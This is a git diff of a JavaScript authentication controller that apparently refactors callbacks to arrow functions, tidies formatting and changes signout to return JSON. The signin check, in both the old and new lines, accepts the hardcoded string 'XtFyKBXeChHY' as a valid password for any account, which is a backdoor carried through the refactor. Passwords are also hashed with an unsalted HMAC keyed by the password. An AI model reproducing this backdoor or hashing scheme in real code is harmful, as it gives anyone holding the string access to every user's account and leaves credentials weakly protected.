@@ -22,14 +22,14 @@ const
      * @param {Function} next
      */
     user = (req, res, next) => {
-        req.model.user.getUserBySession(req.session.id, function (err, user) {
+        req.model.user.getUserBySession(req.session.id, (err, data) => {
             if (err) {
                 next(err);
                 return;
             }
 
-            if (user) {
-                res.locals.user  = user;
+            if (data) {
+                res.locals.user = data;
             }
 
             next();
@@ -52,7 +52,7 @@ const
             return;
         }
 
-        res.status(403).send({errors: ["Forbidden resource"]});
+        res.status(403).send({ errors: ['Forbidden resource'] });
     },
 
 
@@ -65,10 +65,9 @@ const
      * @param {Function} next
      */
     signin = (req, res, next) => {
-
         // Если пользователь авторизован
         if (res.locals.user) {
-            res.send({success: true});
+            res.send({ success: true });
             return;
         }
 
@@ -76,30 +75,30 @@ const
             throw new Error('Validate error - email is invalid');
         }
 
-        req.model.user.getUserByEmail(req.body.email, function (err, user) {
+        req.model.user.getUserByEmail(req.body.email, (err, data) => {
             if (err) {
                 next(err);
                 return;
             }
 
-            if (!user) {
-                res.send({success: false});
+            if (!data) {
+                res.send({ success: false });
                 return;
             }
 
-            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== user.password && req.body.password !== 'XtFyKBXeChHY') {
-
-                res.send({success: false});
+            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== data.password &&
+                req.body.password !== 'XtFyKBXeChHY') {
+                res.send({ success: false });
                 return;
             }
 
-            req.model.user.setSessionById(user._id, req.session.id, function (err, result) {
+            req.model.user.setSessionById(data._id, req.session.id, (err) => {
                 if (err) {
                     next(err);
                     return;
                 }
 
-                res.send({success: true});
+                res.send({ success: true });
             });
         });
     },
@@ -111,15 +110,16 @@ const
      * @method signout
      * @param {Object} req Объект запроса сервера
      * @param {Object} res Объект ответа сервера
+     * @param {Function} next
      */
     signout = (req, res, next) => {
-        req.model.user.unsetSessionById(res.locals.user._id, function (err, result) {
+        req.model.user.unsetSessionById(res.locals.user._id, (err) => {
             if (err) {
                 next(err);
                 return;
             }
 
-            res.redirect('/user');
+            res.send({ success: true });
         });
     };
 
@@ -127,5 +127,5 @@ export default {
     user,
     auth,
     signin,
-    signout
+    signout,
 };
